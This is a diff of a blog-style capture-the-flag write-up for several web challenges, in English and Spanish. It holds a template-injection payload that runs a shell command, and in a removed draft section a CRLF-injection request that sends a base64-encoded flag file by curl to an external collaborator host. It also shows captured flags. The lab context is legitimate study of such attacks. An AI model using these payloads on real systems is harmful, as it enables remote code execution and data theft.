@@ -88,6 +88,7 @@ The template is the following, so we should hit the endpoint /battle-report in o
 </div>
 ```
 ![a](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-3.png)
+
 ![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-11.png)
 
 After verifying that our string payload 7*7 is renderized as 49 in the response, we should inject our final payload to read the flag.
@@ -99,7 +100,7 @@ After verifying that our string payload 7*7 is renderized as 49 in the response,
 ```liquid
 warrior_name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20flag.txt').read()}}
 ```
-{% end raw %}
+{% endraw %}
 
 ![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-6.png)
 
@@ -110,16 +111,12 @@ HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_9c285b69f155f1d253dfefe5fe30667d}
 
 # Cyber Attack
 
-
-# todo :
-realizar las capturas en caido; solo hacer los retos web
-el utlimo reto hacerlo cuando salgan los writeups
-
 Este reto tiene varios pasos, pero en general se abusará de CRLF Injection + Proxy + RCE
 
 ![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-14.png)
 
 Se observa un panel con 2 campos, name y domain, solo se puede usar el boton de Attack a Domain, ya que el boton de Attack an IP solo se puede realizar desde localhost. Gracias a esta porción de código en el index.php
+
 ```js
 // Check if the user's IP is local
 const isLocalIP = (ip) => {
@@ -131,13 +128,6 @@ const userIP = "<?php echo $_SERVER['REMOTE_ADDR']; ?>";
 
 // Enable/disable the "Attack IP" button based on the user's IP
 const attackIPButton = document.getElementById("attack-ip");
-```
-
-Este r
-
-el ctf acaba 8am de 26
-```js
-GET /cgi-bin/attack-domain?target=-&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%25%32%30cfvekttb0yhbc2ia84d9zkasqjwak68v.oastify.com?p=$(echo%25%32%30%27cd%25%32%30..%25%33%62cd%25%32%30..%25%33%62cd%25%32%30..%25%33%62%25%32%30cat%25%32%30flag-jQpEEi2A5JK8HR8.txt%27|sh|%25%32%30base64%25%32%30-w0))%260name=%0D%0A%0D%0A
 ```
 
 attack-domain file:
@@ -253,37 +243,16 @@ GET /cgi-bin/attack-domain?target=-&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+
 Get the flag. 🎉
 HTB{h4ndl1n6_m4l4k4r5_f0rc35}
 
-```go
-func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
-	if req.Customer == "" {
-		return nil, errors.New("Name is required")
-	}
-	if req.Testimonial == "" {
-		return nil, errors.New("Content is required")
-	}
-
-	err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
-	if err != nil {
-		return nil, err
-	}
-
-	return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
-}
-```
-
 # Eldoria Panel
 
 ![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-20.png)
 
 Nos encontramos con este panel, existe una funcionalidad de "claim guest"
 
-
-
 https://sftpcloud.io/tools/free-ftp-server
 
 FTP upload
 ![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-21.png)
-
 
 
 ![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-17.png)
